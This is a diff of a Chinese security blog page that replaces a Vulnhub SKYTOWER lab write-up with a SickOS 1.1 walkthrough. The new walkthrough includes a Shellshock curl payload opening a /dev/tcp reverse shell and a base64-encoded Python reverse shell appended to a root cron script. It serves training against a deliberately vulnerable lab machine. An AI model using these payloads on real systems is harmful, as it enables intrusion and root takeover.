@@ -13,7 +13,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>Vulnhub-SKYTOWER |  n0rt6&#39;s blog</title>
+      <title>Vulnhub-sickos1.1 |  n0rt6&#39;s blog</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.jpg" />
@@ -59,7 +59,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-Vulnhub-SKYTOWER"
+  id="post-Vulnhub-sickos1-1"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -70,7 +70,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  Vulnhub-SKYTOWER
+  Vulnhub-sickos1.1
 </h1>
  
 
@@ -78,8 +78,8 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2024/03/02/Vulnhub-SKYTOWER/" class="article-date">
-  <time datetime="2024-03-02T08:12:30.000Z" itemprop="datePublished">2024-03-02</time>
+      <a href="/2024/03/08/Vulnhub-sickos1-1/" class="article-date">
+  <time datetime="2024-03-08T03:13:59.000Z" itemprop="datePublished">2024-03-08</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">826</span>
+            <span class="post-count">856</span>
         </span>
     </span>
 
@@ -116,56 +116,49 @@
        
   <meta name="referrer" content="no-referrer"/>
 
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用nmap扫描主机进行信息收集</p>
-<blockquote>
-<p>nmap 192.168.206.151 -p- -A -SV</p>
-</blockquote>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-03-02 <span class="token number">14</span>:11 CST
-Stats: <span class="token number">0</span>:00:05 elapsed<span class="token punctuation">;</span> <span class="token number">0</span> hosts completed <span class="token punctuation">(</span><span class="token number">1</span> up<span class="token punctuation">)</span>, <span class="token number">1</span> undergoing SYN Stealth Scan
-SYN Stealth Scan Timing: About <span class="token number">7.96</span>% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: <span class="token number">14</span>:12 <span class="token punctuation">(</span><span class="token number">0</span>:00:23 remaining<span class="token punctuation">)</span>
-Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.151
-Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00070s latency<span class="token punctuation">)</span>.
-Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
-PORT     STATE    SERVICE    VERSION
-<span class="token number">22</span>/tcp   filtered <span class="token function">ssh</span>
-<span class="token number">80</span>/tcp   <span class="token function">open</span>     http       Apache httpd <span class="token number">2.2</span>.22 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
-<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
-<span class="token operator">|</span>_http-server-header: Apache/2.2.22 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
-<span class="token number">3128</span>/tcp <span class="token function">open</span>     http-proxy Squid http proxy <span class="token number">3.1</span>.20
-<span class="token operator">|</span>_http-title: ERROR: The requested URL could not be retrieved
-<span class="token operator">|</span>_http-server-header: squid/3.1.20
-MAC Address: 00:0C:29:82:E8:ED <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
-Device type: general purpose
-Running: Linux <span class="token number">3</span>.X
-OS CPE: cpe:/o:linux:linux_kernel:3
-OS details: Linux <span class="token number">3.2</span> - <span class="token number">3.10</span>, Linux <span class="token number">3.2</span> - <span class="token number">3.16</span>
-Network Distance: <span class="token number">1</span> hop
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打的这两个靶场均涉及到代理，值得学习。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用nmap发现主机192.168.206.152。扫描开了三个端口22，8080，3128，信息如下：<br>:<img src="https://img-blog.csdnimg.cn/direct/ae48518e34cd41b2bace11afe01d6eff.png" alt="123"><br>当访问<code>192.168.206.152:8080</code>的时候发现无响应，8080端口显示的http代理关闭，3128端口是开放的，运行着 Squid HTTP 代理 3.1.19 版本。那么改变一下浏览器的代理就可以访问网站了。</p>
+<p><img src="https://img-blog.csdnimg.cn/direct/98f1768860c146a5b3b4cff4e4a65422.png" alt="123"><br>然后访问<a target="_blank" rel="noopener" href="http://192.168.206.152/%E3%80%82">http://192.168.206.152/。</a><br>尝试进行目录扫描，发现在使用kali进行目录扫描时并无响应<br><img src="https://img-blog.csdnimg.cn/direct/e5ead531f9134d7ea64dfd897ee0cf39.png" alt="123"></p>
+<p>在扫描时也要通过代理：<code>dirsearch -u http://192.168.206.152/ --proxy http://192.168.206.152:3128</code>或者<code>dirb http://192.168.206.152/ -p http://192.168.206.152:3128</code><br>扫描到robots.txt,存在wolfcms目录<br><img src="https://img-blog.csdnimg.cn/direct/9fc16baeeadd44c39eead7dada2c2f8a.png" alt="123"><br>继续进行深度目录扫描，没有找到后台登陆入口，网上搜索一下相关漏洞:<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1047292">Wolf CMS 新旧两个版本中的文件上传漏洞分析
+</a><br>找到后台入口&#x2F;wolfcms&#x2F;?&#x2F;admin，弱密码admin&#x2F;admin<br>在file下上传反弹shell的PHP文件<br><img src="https://img-blog.csdnimg.cn/direct/dd497660c3bf487fa0b7be670c61302d.png" alt="123"></p>
+<p>kali开启监听6666，靶机访问该文件<code>http://192.168.206.152/wolfcms/public/shell.php</code><br><img src="https://img-blog.csdnimg.cn/direct/26ed64e38a5b4853a17b66f5c56e6885.png" alt="123"></p>
+<p>找敏感文件，发现wolfcms&#x2F;config.php文件中存在数据库账号密码<br><img src="https://img-blog.csdnimg.cn/direct/d5fe75fb34fb4461bf42a05b1d6443c9.png" alt="123"><br>尝试进行连接发现无法连接，继续收集信息发现存在用户sickos，尝试使用数据库密码切换到该用户ssh远程登陆<br><img src="https://img-blog.csdnimg.cn/direct/f042fb306fc7439d8240dd07c363f71d.png" alt="123"><br>发现具有sudo所有权限<br><img src="https://img-blog.csdnimg.cn/direct/b6351fce09ef4499a6537657165a104c.png" alt="123"><br>直接sudo &#x2F;bin&#x2F;bash，拿到root权限<br><img src="https://img-blog.csdnimg.cn/direct/031d061fb5324d9db4fb41cf80fb3a36.png" alt="123"><br>至此结束！</p>
+<h2 id="二解"><a href="#二解" class="headerlink" title="二解"></a>二解</h2><p>有发现网上有第二种解法，复现一下<br>他这里使用nikto扫描到漏洞<br><code>nikto -h 192.168.206.152 -useproxy http://192.168.206.152:3128</code><br><img src="https://img-blog.csdnimg.cn/direct/3cb32fd75d434632817244fdf89f3ac9.png" alt="798"></p>
+<p>发现破壳漏洞cve-2014-6271</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先检测漏洞是否存在<br><code>sudo curl -v --proxy http://192.168.206.152:3128 http://192.168.206.152/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo &#39;Content-Type: text/plain&#39;; echo; echo; /usr/bin/echo; exit&quot;&quot;</code><br><img src="https://img-blog.csdnimg.cn/direct/f0f51a6b375c4f4280e4e79d97ac8215.png" alt="123"></p>
+<p>成功执行。</p>
+<h3 id="shellshock漏洞利用"><a href="#shellshock漏洞利用" class="headerlink" title="shellshock漏洞利用"></a>shellshock漏洞利用</h3><h4 id="msfvenom反弹shell"><a href="#msfvenom反弹shell" class="headerlink" title="msfvenom反弹shell"></a>msfvenom反弹shell</h4><p>使用msf来生成反弹马<br><img src="https://img-blog.csdnimg.cn/direct/579ef83031714acbb7162a8a9c8751b4.png" alt="123"><br>执行命令：<code>curl -v --proxy http://192.168.206.152:3128 http://192.168.206.152/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;120-;exec 120&lt;&gt;/dev/tcp/192.168.206.138/6666;/bin/bash &lt;&amp;120 &gt;&amp;120 2&gt;&amp;120&quot;</code><br>如果一次不行可以多试几次，kali监听端口<code>nc -lnvp 6666</code><br>反弹成功后查看权限为www-data</p>
+<h4 id="定时任务进行提权"><a href="#定时任务进行提权" class="headerlink" title="定时任务进行提权"></a>定时任务进行提权</h4><p>在&#x2F;var&#x2F;www目录下发现文件connect.py文件，而且文件权限是777<br><code>-rwxrwxrwx  1 root     root      109 Dec  5  2015 connect.py</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
 
-TRACEROUTE
-HOP RTT     ADDRESS
-<span class="token number">1</span>   <span class="token number">0.70</span> ms <span class="token number">192.168</span>.206.151
+<span class="token keyword">print</span> <span class="token string">"I Try to connect things very frequently\n"</span>
+<span class="token keyword">print</span> <span class="token string">"You may want to try my services"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>意思是涉及到定时任务？搜索一下，定时任务文件文件名通常带有<strong>cron</strong>，到&#x2F;etc目录下查找一下</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc$ <span class="token function">ls</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cron"</span>
+<span class="token function">ls</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cron"</span>
+cron.d
+cron.daily
+cron.hourly
+cron.monthly
+cron.weekly
+<span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最后发现cron.d目录下的automate文件中内容</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc/cron.d$ <span class="token function">cat</span> auto*
+<span class="token function">cat</span> auto*
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
-Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">40.61</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>信息整理：<br>开放端口：22（ssh） 80（http） 3128（代理端口）</p>
-<h2 id="web页面"><a href="#web页面" class="headerlink" title="web页面"></a>web页面</h2><p>访问80端口进行目录扫描发现三个文件<br><img src="https://img-blog.csdnimg.cn/direct/51b00da8b31a487d9db8779f35d5f1cc.png" alt="123"><br>主页面是一个登录窗口<br><img src="https://img-blog.csdnimg.cn/direct/382e43ac70da4eca993b41258eb05430.png" alt="213"><br>尝试进行弱口令登录无果，测试SQL注入。<br>发现存在sql注入<br><img src="https://img-blog.csdnimg.cn/direct/5e8ab8649f634da29b8532146ff9682f.png" alt="123"><br>多次测试后发现可以成功登录<br><img src="https://img-blog.csdnimg.cn/direct/8930a7299c664de388f3ba4d37932f72.png" alt="456"><br>给出了账号密码<code>john/hereisjohn</code><br><img src="https://img-blog.csdnimg.cn/direct/67a0398fa2284aae8891c68881d059e1.png" alt="45"><br>使用该账号密码登录网页不行，ssh也无反应，想起收集信息时发现3128端口开启了代理，那么使用代理工具proxytunnel进行访问。</p>
-<h2 id="proxytunnel"><a href="#proxytunnel" class="headerlink" title="proxytunnel"></a>proxytunnel</h2><p>proxytunnel是一款利用http connection封装技术建立隧道的工具。<br>适用条件<br>防火墙禁止DNS和ICMP隧道，只允许代理服务器上网的情景。</p>
-<p>proxytunnel常用命令<br>-a                   指定本地侦听端口</p>
-<p>-p                   使用代理</p>
-<p>-r                    使用第二个代理</p>
-<p>-d                   指定访问的目标和端口<br>kali自带该工具</p>
-<blockquote>
-<p><code>proxytunnel  -p 192.168.206.151:3128 -d 127.0.0.1:22 -a 6666</code></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/direct/9562b8ee604943e3ba8a07e2c8001a11.png" alt="123"></p>
-<h2 id="连接ssh"><a href="#连接ssh" class="headerlink" title="连接ssh"></a>连接ssh</h2><p>开启建立后打开另一个终端进行ssh连接，发现连接上之后就会立即断开<br><img src="https://img-blog.csdnimg.cn/direct/134e48a161034a7583f63e5f25585fcf.png" alt="456"></p>
-<p>涉及到了<code>.bashrc</code>文件，在加载shell的时候由于<code>.bashrc</code>文件的配置，bash 在每次启动时都会加载 .bashrc 文件的内容。每个用户的 home 目录都有这个 shell 脚本。它用来存储并加载你的终端配置和环境变量。<br>有可能<code>.bashrc</code>文件写有关闭shell的内容，这里有两个方法：<br>第一：删除.bashrc文件（有风险）<br>第二：使用-t 来开启一个终端</p>
-<blockquote>
-<p>ssh <a href="mailto:&#106;&#x6f;&#x68;&#x6e;&#x40;&#49;&#50;&#x37;&#x2e;&#48;&#46;&#48;&#x2e;&#49;">&#106;&#x6f;&#x68;&#x6e;&#x40;&#49;&#50;&#x37;&#x2e;&#48;&#46;&#48;&#x2e;&#49;</a> -p 6666 -t “&#x2F;bin&#x2F;&#x2F;sh” </p>
-</blockquote>
-<p>使用第二种<br>连接完成之后对靶机进行信息收集，找到login.php中存在数据库账号密码<br><img src="https://img-blog.csdnimg.cn/direct/80429c4272d7467bb82055fef168896a.png" alt="456"><br>连接数据库后发现另外两个用户，查看&#x2F;home下确实存在。<br><img src="https://img-blog.csdnimg.cn/direct/0eca6ffdb4534c6f9d9737e315693be4.png" alt="123"></p>
-<p>sara可以连接，william不可以。连接后发现sara用户存在一定的root权限<br><img src="https://img-blog.csdnimg.cn/direct/f7fd2f112f864ce0bd1ae9d831d95ab0.png" alt="789"><br>查看root目录下的flag.txt文件发现有root密码<br><img src="https://img-blog.csdnimg.cn/direct/837b5f62fa1842188b881a0b00844608.png" alt="456"><br>连接ssh，拿到flag。<br><img src="https://img-blog.csdnimg.cn/direct/472f4411a17e45bbad93ea73a3468ef7.png" alt="456"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以SQL注入为入口找到账号密码，搭建代理隧道后连接ssh，在login.php文件下发现数据库账号密码。通过数据库查到其他用户的账号密码，发现sara用户存在root权限，在root下发现root密码，然后连接ssh拿到root下的flag。</p>
+* * * * * root /usr/bin/python /var/www/connect.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>定时执行connect.py文件<br>msfvenom生成反弹shellpayload<br><code>msfvenom -p cmd/unix/reverse_python LHOST=192.168.206.138 LPORT=4444 -f raw</code><br><img src="https://img-blog.csdnimg.cn/direct/28429ce94bbc46aa8b8c96af7cfe01e7.png" alt="123"></p>
+<p>写入文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc/cron.d$ <span class="token builtin class-name">echo</span> <span class="token string">"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zOyAgICAgICAgaG9zdD0iMTkyLjE2OC4yMDYuMTM4IjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgLCAgICBzb2NrZXQuU09DS19TVFJFQU0pOyAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAsICAgIHBvcnQpKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAxKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAyKTsgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"</span> <span class="token operator">>></span> /var/www/connect.py
+<span class="token operator">&lt;</span>KCIvYmluL2Jhc2giKQ<span class="token operator">==</span><span class="token string">')[0]))" >> /var/www/connect.py                         
+www-data@SickOs:/etc/cron.d$ cat /var/www/connect.py
+cat /var/www/connect.py
+#!/usr/bin/python
+
+print "I Try to connect things very frequently\n"
+print "You may want to try my services"
+exec(__import__('</span>base64<span class="token string">').b64decode(__import__('</span>codecs<span class="token string">').getencoder('</span>utf-8<span class="token string">')('</span>aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zOyAgICAgICAgaG9zdD0iMTkyLjE2OC4yMDYuMTM4IjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgLCAgICBzb2NrZXQuU09DS19TVFJFQU0pOyAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAsICAgIHBvcnQpKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAxKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAyKTsgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ<span class="token operator">==</span>'<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后kali监听4444端口，等待片刻。。。<br><img src="https://img-blog.csdnimg.cn/direct/b33aca2418054003a3ea827c420348af.png" alt="123"></p>
  
       <!-- reward -->
       
@@ -236,7 +229,7 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2024/03/02/Vulnhub-SKYTOWER/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2024/03/08/Vulnhub-sickos1-1/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -247,19 +240,10 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
    
   <nav class="article-nav">
     
-      <a href="/2024/03/08/Vulnhub-sickos1-1/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            Vulnhub-sickos1.1
-          
-        </div>
-      </a>
     
-    
-      <a href="/2024/03/01/BJDCTF2020-EzPHP/" class="article-nav-link">
+      <a href="/2024/03/02/Vulnhub-SKYTOWER/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">BJDCTF2020-EzPHP</div>
+        <div class="article-nav-title">Vulnhub-SKYTOWER</div>
       </a>
     
   </nav>
